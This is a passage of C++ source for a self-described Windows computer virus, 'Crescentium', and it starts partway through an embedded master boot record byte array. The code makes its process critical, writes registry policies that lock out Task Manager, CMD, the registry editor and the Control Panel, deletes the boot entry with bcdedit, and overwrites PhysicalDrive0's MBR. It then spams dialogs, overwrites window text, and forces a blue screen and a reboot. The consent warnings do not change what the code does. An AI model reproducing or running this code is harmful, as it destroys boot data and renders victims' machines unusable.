7E,0x40,0x01,0x04,0x28,0x01,0x22,0x1B,0x05,0x40,0xF9,0x40,0x01,0x3A,0xAA,0x2B,0x41,0x05,0x40,0x01,0x3B,0xEA,0x2C,0x0C,0x40,0x01,0x40,0x9D,0xFF,0x04,0x40,0xEA,0x40,0x01,0x33,0x3F,0x01,0x40,0x7E,0x40,0x01,0x3C,0x6A,0x2F,0x41,0x03,0x40,0x01,0x3D,0xAA,0x30,0x41,0x40,0x40,0x01,0x0B,0x40,0x01,0x40,0x7B,0xFF,0x04,0x40,0x7C,0x40,0x01,0x3E,0x69,0x34,0x0A,0x40,0x01,0x40,0x48,0x3F,0x01,0x41,0x40,0x40,0x01,0x40,0xAF,0x40,0x01,0x3E,0x3F,0x01,0x41,0x40,0x40,0x01,0x41,0x40,0x40,0x01,0x0A,0x80,0x11,0x40,0x7D,0x3F,0x01,0x40,0x7A,0x40,0x01,0x40,0x48,0x7F,0x02,0x40,0x7E,0x40,0x01,0x23,0x3F,0x01,0x40,0x56,0x40,0x01,0x40,0x49,0x3F,0x01,0x40,0xF6,0x40,0x01,0x3F,0x3F,0x01,0x40,0x54,0x40,0x01,0x40,0x58,0xBF,0x03,0x40,0x54,0x40,0x01,0x40,0x4B,0x3F,0x01,0x40,0xF4,0x40,0x01,0x40,0x4C,0x3F,0x01,0x41,0x40,0x40,0x01,0x40,0xF3,0x40,0x01,0x40,0xCA,0x3F,0x01,0x41,0x40,0x40,0x01,0x40,0x75,0x40,0x01,0x40,0x40,0x3F,0x01,0x40,0x55,0x3E,0x06,0x40,0xAA,0x40,0x01,0x40,0x4D,0x3F,0x01,0x40,0xF2,0x40,0x01,0x40,0x4E,0x3F,0x01,0x40,0x7F,0xBF,0x03,0x40,0x72,0x40,0x01,0x40,0x41,0x3F,0x01,0x40,0xB1,0x7F,0x02,0x40,0x4D,0x40,0x01,0x40,0x42,0x3F,0x01,0x41,0x40,0x40,0x01,0x40,0x56,0x3E,0x06,0x40,0xA7,0x40,0x01,0x40,0x4F,0x3F,0x01,0x40,0x7E,0xFB,0x13,0x40,0xC1,0x40,0x01,0x40,0x4A,0x3A,0x1A,0x40,0xA7,0x40,0x01,0x40,0x43,0x3F,0x01,0x40,0xFC,0x40,0x01,0x40,0x44,0x3F,0x01,0x0D,0xF9,0x27,0x40,0x80,0x3F,0x01,0x41,0x40,0x40,0x01,0x40,0x6E,0x40,0x01,0x40,0x4F,0x3F,0x01,0x40,0x4B,0x3E,0x06,0x40,0x5D,0xBF,0x03,0x41,0x40,0x40,0x01,0x40,0x46,0x40,0x01,0x40,0x45,0x3D,0x01,0x40,0x58,0xBF,0x03,0x40,0xA2,0x40,0x01,0x40,0x48,0x3F,0x01,0x40,0xF7,0x40,0x01,0x40,0x49,0x3F,0x01,0x0C,0x40,0x01,0x40,0x4A,0x3F,0x01,0x40,0xA0,0x40,0x01,0x40,0x4A,0x3F,0x01,0x40,0x56,0x40,0x01,0x40,0x5D,0x7F,0x07,0x40,0x42,0x40,0x01,0x40,0x4B,0x3F,0x01,0x40,0x54,0x38,0x1F,0x40,0x5F,0x7F,0x02,0x40,0x41,0x40,0x01,0x40,0x4C,0x3F,0x01,0x41,0x40,0x40,0x01,0x40,0xF3,0x40,0x01,0x40,0x4D,0x3F,0x01,0x40,0x55,0x40,0x01,0x40,0x5E,0xFF,0x04,0x41,0x40,0x40,0x01,0x3F,0x40,0x01,0x40,0x4E,0x3F,0x01,0x40,0xF1,0x40,0x01,0x40,0x4F,0x3F,0x01,0x40,0xF0,0x40,0x01,0x40,0x50,0x3F,0x01,0x40,0x8C,0x40,0x01,0x27,0x3F,0x01,0x3B,0x40,0x01,0x40,0x51,0x3E,0x01,0x40,0x8A,0x78,0x2A,0x41,0x40,0x40,0x01,0x41,0xA3,0x80,0x02,0x40,0x53,0x3E,0x01,0x40,0xEC,0x40,0x01,0x40,0x55,0x3F,0x01,0x40,0x53,0x40,0x01,0x38,0x3F,0x01,0x40,0x5F,0x40,0x01,0x40,0x56,0x3F,0x01,0x40,0x52,0x40,0x01,0x40,0x61,0x3F,0x01,0x41,0x40,0x40,0x01,0x40,0xDE,0x40,0x01,0x39,0x3F,0x01,0x40,0x5E,0x40,0x01,0x40,0x57,0x3E,0x01,0x41,0x40,0x40,0x01,0x41,0x4B,0x80,0x02,0x40,0x80,0x3F,0x01,0x40,0x5C,0x40,0x01,0x40,0x59,0x3E,0x01,0x0B,0x41,0x01,0x40,0xDB,0x40,0x01,0x40,0x5C,0x3F,0x01,0x08,0x40,0x01,0x40,0x80,0x7E,0x07,0x40,0x5B,0x40,0x01,0x40,0x5D,0x3F,0x01,0x07,0x41,0x01,0x40,0x82,0x3F,0x01,0x40,0xB9,0x40,0x01,0x80,0x01,0x40,0x86,0x3F,0x01,0x40,0x59,0x40,0x01,0x40,0x5F,0x3F,0x01,0x40,0x83,0x37,0x1F,0x40,0x5D,0x40,0x01,0x40,0xAB,0x3F,0x01,0x41,0x40,0x40,0x01,0x40,0x66,0x3F,0x01,0x2E,0x40,0x01,0x40,0x60,0x3F,0x01,0x40,0xDF,0x40,0x01,0x40,0xE9,0x3F,0x01,0x40,0x56,0x40,0x01,0x40,0x61,0x3F,0x01,0x40,0xDD,0x40,0x01,0x40,0x62,0x3E,0x01,0x40,0x8A,0x3E,0x06,0x41,0x02,0x40,0x01,0x3E,0x3F,0x01,0x40,0x53,0x40,0x01,0x40,0x63,0x3F,0x01,0x40,0xDB,0x40,0x01,0x40,0x64,0x3E,0x01,0x40,0x8B,0xBF,0x03,0x40,0x50,0x40,0x01,0x40,0xF0,0x3F,0x01,0x41,0x40,0x40,0x01,0x40,0x4E,0x40,0x01,0x40,0x65,0x3E,0x01,0x40,0x8D,0x3F,0x01,0x41,0x40,0x40,0x01,0x40,0x4D,0x40,0x01,0x40,0x66,0x3F,0x01,0x40,0x8B,0x7D,0x07,0x2C,0x3F,0x01,0x22,0x40,0x01,0x40,0xB2,0x3F,0x01,0x40,0x8D,0x40,0x01,0x40,0x67,0x3F,0x01,0x40,0xD7,0x40,0x01,0x40,0x68,0x3E,0x01,0x0A,0x3F,0x01,0x40,0x43,0x80,0x16,0x40,0x6C,0x3F,0x01,0x40,0x90,0x40,0x01,0x40,0x44,0x00,0x19,0x40,0xF3,0x40,0x01,0x0D,0x3F,0x01,0x3F,0x40,0x01,0x40,0x41,0x3F,0x01,0x40,0x4A,0x40,0x01,0x40,0x70,0x7F,0x02,0x40,0x45,0xFF,0x1D,0x40,0x6D,0x3F,0x01,0x40,0x96,0x40,0x01,0x3C,0x41,0x01,0x40,0x6E,0x7F,0x02,0x40,0x86,0x40,0x01,0x0E,0xBF,0x03,0x40,0xC9,0x40,0x01,0x40,0x79,0x7F,0x02,0x40,0xC6,0x40,0x01,0x40,0x76,0x7D,0x07,0x41,0x40,0x40,0x01,0x3F,0x40,0x01,0x40,0x42,0x3F,0x01,0x40,0xB1,0x40,0x01,0x0C,0x3C,0x0B,0x40,0x40,0x40,0x01,0x40,0x70,0x3F,0x01,0x41,0x40,0x40,0x01,0x1B,0x40,0x01,0x40,0x73,0xFA,0x0E,0x40,0x41,0x40,0x01,0x40,0x43,0x3F,0x01,0x40,0xC4,0x40,0x01,0x40,0x7C,0x7F,0x02,0x40,0xBC,0x40,0x01,0x08,0x41,0x01,0x40,0xC4,0x40,0x01,0x40,0x76,0xB9,0x12,0x40,0xB0,0x3F,0x01,0x19,0x40,0x01,0x40,0x72,0xBA,0x12,0x40,0x42,0xC0,0x12,0x40,0x44,0x3F,0x01,0x40,0x47,0x40,0x01,0x40,0x78,0x3F,0x01,0x40,0x7F,0x7A,0x11,0x41,0x40,0x40,0x01,0x40,0x47,0x40,0x01,0x40,0x69,0x3E,0x01,0x40,0xD6,0x40,0x01,0x40,0xFC,0x3F,0x01,0x40,0x43,0x40,0x01,0x40,0x6B,0x3F,0x01,0x40,0xD4,0x40,0x01,0x40,0xFE,0x3F,0x01,0x40,0x41,0x40,0x01,0x40,0x6C,0x3F,0x01,0x40,0x8D,0x35,0x1F,0x35,0x3F,0x01,0x40,0x7E,0x40,0x01,0x40,0x92,0x3F,0x01,0x40,0x41,0x40,0x01,0x40,0xB7,0x7F,0x02,0x40,0x48,0x3F,0x01,0x40,0x40,0x40,0x01,0x41,0x00,0x3F,0x01,0x3F,0x40,0x01,0x40,0xFF,0xFD,0x04,0x32,0x3F,0x01,0x0C,0x40,0x01,0x40,0x6D,0x3D,0x01,0x40,0x96,0x7E,0x02,0x3C,0x40,0x01,0x40,0xB9,0x3F,0x01,0x40,0xF5,0x40,0x01,0x40,0x96,0x3F,0x01,0x3B,0x40,0x01,0x40,0xB8,0x3E,0x01,0x40,0x4D,0x3F,0x01,0x3A,0x40,0x01,0x41,0x37,0x3F,0x01,0x40,0x75,0x40,0x01,0x40,0x99,0x3F,0x01,0x39,0x40,0x01,0x40,0xB7,0x3D,0x01,0x40,0x50,0x3F,0x01,0x40,0xA3,0x40,0x01,0x40,0x4E,0x3F,0x01,0x40,0x85,0x40,0x01,0x40,0xB8,0xBB,0x03,0x40,0x51,0x3E,0x01,0x35,0x40,0x01,0x40,0xB9,0xB7,0x08,0x40,0x86,0x40,0x01,0x41,0x3F,0x3F,0x01,0x40,0x6C,0x40,0x01,0x40,0x4F,0xFB,0x04,0x40,0x52,0x3F,0x01,0x40,0x9E,0x40,0x01,0x40,0xA2,0x3F,0x01,0x41,0x40,0x40,0x01,0x40,0x9B,0x40,0x01,0x40,0x50,0x3D,0x01,0x40,0x54,0x3E,0x01,0x34,0x3F,0x01,0x41,0x40,0x40,0x01,0x40,0x66,0x40,0x01,0x40,0x51,0x3E,0x01,0x40,0x55,0x3F,0x01,0x40,0x98,0x40,0x01,0x40,0xA7,0x3E,0x01,0x41,0x40,0x40,0x01,0x40,0x96,0x40,0x01,0x40,0x52,0x3D,0x01,0x40,0x59,0x3F,0x01,0x40,0x94,0x40,0x01,0x40,0xAC,0x3F,0x01,0x40,0x93,0x40,0x01,0x40,0xAD,0x3F,0x01,0x40,0x91,0x40,0x01,0x40,0x54,0x3E,0x01,0x40,0x8F,0x3F,0x01,0x40,0x5B,0x40,0x01,0x40,0x55,0x3E,0x01,0x41,0x40,0x40,0x01,0x40,0x90,0x3F,0x01,0x40,0x58,0x40,0x01,0x40,0x57,0x7D,0x02,0x40,0x5B,0x3F,0x01,0x41,0x40,0x40,0x01,0x40,0x8C,0x40,0x01,0x40,0xB3,0x3E,0x01,0x37,0x3F,0x01,0x40,0x55,0x40,0x01,0x40,0x58,0x3F,0x01,0x40,0xE7,0x40,0x01,0x40,0xB4,0x3E,0x01,0x40,0x8B,0x40,0x01,0x40,0xED,0x3F,0x01,0x40,0x52,0x40,0x01,0x40,0xB5,0xBD,0x03,0x40,0x8A,0x40,0x01,0x40,0xEF,0x3F,0x01,0x40,0x4F,0x40,0x01,0x40,0x59,0x3E,0x01,0x40,0x98,0x3F,0x01,0x40,0x4E,0x40,0x01,0x40,0xF2,0x3F,0x01,0x40,0x4D,0x40,0x01,0x40,0xB6,0x3D,0x01,0x3C,0x3E,0x01,0x40,0xA5,0x40,0x01,0x40,0x9C,0x3F,0x01,0x40,0x4C,0x40,0x01,0x40,0xF4,0x3F,0x01,0x40,0x4B,0x40,0x01,0x40,0xF4,0x3E,0x01,0x40,0x4B,0x40,0x01,0x40,0xF0,0x39,0x06,0x40,0xA5,0x40,0x01,0x40,0x5F,0x7E,0x02,0x40,0x8A,0x40,0x01,0x40,0xB5,0xBD,0x03,0x40,0x43,0x3F,0x01,0x40,0x9B,0x40,0x01,0x40,0x60,0x3D,0x01,0x40,0x8C,0x40,0x01,0x40,0xB6,0x3F,0x01,0x40,0x88,0x40,0x01,0x40,0xB6,0x3D,0x01,0x40,0x45,0x3F,0x01,0x40,0x95,0x40,0x01,0x40,0x66,0x3E,0x01,0x40,0x87,0x40,0x01,0x40,0xB6,0x3B,0x01,0x40,0x48,0x3F,0x01,0x40,0x41,0x40,0x01,0x40,0xB8,0x3D,0x01,0x40,0x47,0x3F,0x01,0x40,0x8C,0x40,0x01,0x40,0x6E,0x3F,0x01,0x40,0x85,0x40,0x01,0x40,0xB8,0x3C,0x01,0x40,0x49,0x3F,0x01,0x40,0x86,0x40,0x01,0x40,0x72,0x3E,0x01,0x40,0x86,0x40,0x01,0x40,0xBA,0x3E,0x01,0x40,0x84,0x40,0x01,0x40,0xBA,0x3C,0x01,0x40,0x4A,0x3F,0x01,0x40,0x6F,0xC0,0x35,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);
BOOL EnablePriv(LPCWSTR lpszPriv) //enable Privilege
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}
BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}
DWORD WINAPI KillMBR(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 2560, &dwBytesWritten, 0);
	return 1;
}
void reg_addition(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, unsigned int Value)//credits to Mist0090 because creating registry keys in C++ without sh*tty system() or reg.exe is hell
{
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;
	result = RegCreateKeyExW(
		HKey, //HKEY
		Subkey,
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&hKey,
		&dwDisposition
	);
	result = RegSetValueExW(
		hKey,
		ValueName,
		0,
		Type,
		(const unsigned char*)&Value,
		(int)sizeof(Value)
	);
	RegCloseKey(hKey);
	return;
}
DWORD WINAPI fe(LPVOID lpParam) {
	while (true) { MessageBox(NULL, L"𦠱𪌋𫟇𣐚𪔙𪶱𠭸𢶱𥷗𣦙𩁑𤥀𪸙𫅳🤜𧠓𦒍𣗚𨪺𢁤𥉥𩩬𤲠𤾜𪵦𤴗𦁭𡌿𩫹𩲟𥕵𧅌𨍖𨽄𦶚𩻼𩱳𦛙𣙣𨧹𤖊𤋅𓉬𤻚𫊋𢍞𡡞𪋎𡌉𤂟𤒖𣦹𦘩𪛒𓐈𨘚𤜔𥢠𣼲𤢬𣷅𫂸𤬍𧦍𩱺𠾯𧹀𠽖𣑙𡊠𩏶𫘳𫠁𐡔𩌰𠁉𩖖𫙅𥖐𧪉𢕣𧗴🌘𤬃𤢲𠱥🌃𩓙𨣑𩿕𤢒𣑼𡡐𪘍𣳝𤵑𫀷𣑈𦪶𩍜𥵳𝚇𥼞𐐫𦓿𤛢𣩁𦕨𠑌𪽑𪤃𤥎𓂥𧳾𡏲𨀧𫂁𐌉𢆄𨂾𠒌𪆼𣻚𤳚𨉣𥀣𨹣𠉪𦳣𣚈𠢑𥇸𣰏𧪉𠷀𡱛𠞀🎣𩹚𑀉𨩹𤺹𨄷𩇿𪽹𫟎𣅬𥎨𨋄𧔌𥕎𫀭𠍭", L"🚍𧽺𓈨𧌭𠋭𢜅𠖆𧃔𢢁𫄄𨘙𩝁𤞌🔩𣆆", MB_ICONERROR); }
	return 0;
}
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) 
{
	SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)L"cc", SMTO_ABORTIFHUNG, 100, NULL);
	return true;
}
DWORD WINAPI SomeTexts(LPVOID lpParam) 
{
	while (true)
	{
		BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
		EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
	}
}
int main()
{
	InitDPI();
	srand(time(NULL));
	SeedXorshift32((DWORD)time(NULL));
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	CREATE_NO_WINDOW;
	if (MessageBoxA(NULL, "Warning! This program is a computer virus that known as 'Crescentium'. It may make your computer cannot work normally. Whether to run or not?\r\n\Please don't maliciously open this program on other people's or public computers! If you accidentally opened it, please click the \"No\" button to cancel the run. If you want to run it, please make sure you are running it on your own computer, or ensure that the virus on this computer is in a secure environment (such as a virtual machine, sandbox, etc.) and turn off all antivirus software. If you are running this program on other people's or public computers, please make sure you are running the harmless edition of this program, and then click the \"Yes\" button to continue.", "Crescentium.exe--First warning", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDNO) { ExitProcess(0); }
	else
	{
		CREATE_NO_WINDOW;
		if (MessageBoxW(NULL, L"This is the last warning!!!\r\n\Do you want to really run? After running, your computer may not work normally! If you run the harmful edition of this program on other people's or public computers, you will be responsible for any losses and legal liabilities caused by running this program! The writer of this computer virus(LambdaTechnology) isn't responsible!!!", L"Crescentium.exe--LAST WARNING", MB_YESNO | MB_ICONWARNING) == IDNO) { ExitProcess(0); }
		else
		{
			ProcessIsCritical();
			system("taskkill /f /im taskmgr.exe");
			reg_addition(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer", L"NoRun", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer", L"NoControlPanel", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableLockWorkstation", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", L"NoLogoff", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableChangePassword", REG_DWORD, 1);
			reg_addition(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"HideFastUserSwiching", REG_DWORD, 1);
			system("bcdedit /delete {current}");
			reg_addition(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 1);
			CreateThread(0, 0, KillMBR, 0, 0, 0);
			Sleep(5000);
			HANDLE thread0_num1 = CreateThread(0, 0, fe, 0, 0, 0);
			Sleep(100);
			HANDLE thread0_num2 = CreateThread(0, 0, SomeTexts, 0, 0, 0);
			HANDLE thread1_num1 = CreateThread(0, 0, Payload1_num1, 0, 0, 0);
			HANDLE thread1_num2 = CreateThread(0, 0, Payload1_num2, 0, 0, 0);
			bytebeat1();
			TerminateThread(thread1_num1, 0);
			CloseHandle(thread1_num1);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread2 = CreateThread(0, 0, Payload2_num1, 0, 0, 0);
			bytebeat2();
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread3 = CreateThread(0, 0, Payload3_num1, 0, 0, 0);
			bytebeat3();
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread4 = CreateThread(0, 0, Payload4_num1, 0, 0, 0);
			bytebeat4();
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread5_num1 = CreateThread(0, 0, Payload5_num1, 0, 0, 0);
			HANDLE thread5_num2 = CreateThread(0, 0, Payload5_num2, 0, 0, 0);
			HANDLE thread5_num3 = CreateThread(0, 0, Payload5_num3, 0, 0, 0);
			bytebeat5();
			TerminateThread(thread5_num1, 0);
			CloseHandle(thread5_num1);
			TerminateThread(thread5_num2, 0);
			CloseHandle(thread5_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread6_num1 = CreateThread(0, 0, Payload6_num1, 0, 0, 0);
			HANDLE thread6_num2 = CreateThread(0, 0, Payload6_num2, 0, 0, 0);
			bytebeat6();
			TerminateThread(thread6_num1, 0);
			CloseHandle(thread6_num1);
			TerminateThread(thread6_num2, 0);
			CloseHandle(thread6_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread7 = CreateThread(0, 0, Payload7_num1, 0, 0, 0);
			bytebeat7();
			TerminateThread(thread7, 0);
			CloseHandle(thread7);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread8_num1 = CreateThread(0, 0, Payload8_num1, 0, 0, 0);
			HANDLE thread8_num2 = CreateThread(0, 0, Payload8_num2, 0, 0, 0);
			bytebeat8();
			TerminateThread(thread8_num1, 0);
			CloseHandle(thread8_num1);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread9 = CreateThread(0, 0, Payload9_num1, 0, 0, 0);
			bytebeat9();
			TerminateThread(thread9, 0);
			CloseHandle(thread9);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread10_num1 = CreateThread(0, 0, Payload10_num1, 0, 0, 0);
			HANDLE thread10_num2 = CreateThread(0, 0, Payload10_num2, 0, 0, 0);
			bytebeat10();
			TerminateThread(thread10_num1, 0);
			CloseHandle(thread10_num1);
			TerminateThread(thread10_num2, 0);
			CloseHandle(thread10_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread11_num1 = CreateThread(0, 0, Payload11_num1, 0, 0, 0);
			HANDLE thread11_num2 = CreateThread(0, 0, Payload11_num2, 0, 0, 0);
			bytebeat11();
			TerminateThread(thread11_num1, 0);
			CloseHandle(thread11_num1);
			TerminateThread(thread11_num2, 0);
			CloseHandle(thread11_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread12 = CreateThread(0, 0, Payload12_num1, 0, 0, 0);
			bytebeat12();
			TerminateThread(thread12, 0);
			CloseHandle(thread12);
			InvalidateRect(0, 0, 0);
			refreshscr();
			TerminateThread(thread0_num1, 0);
			CloseHandle(thread0_num1);
			TerminateThread(thread0_num2, 0);
			CloseHandle(thread0_num2);
			TerminateThread(thread1_num2, 0);
			CloseHandle(thread1_num2);
			TerminateThread(thread5_num3, 0);
			CloseHandle(thread5_num3);
			TerminateThread(thread8_num2, 0);
			CloseHandle(thread8_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(0xCCCCCCCC, 0, 0, 0, 6, &response);
			// If the computer is still running, do it the normal way
			HANDLE token;
			TOKEN_PRIVILEGES privileges;
			OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);
			LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
			privileges.PrivilegeCount = 1;
			privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);
			// The actual restart
			ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
			Sleep(-1);
		}
	}
	return 0;
}
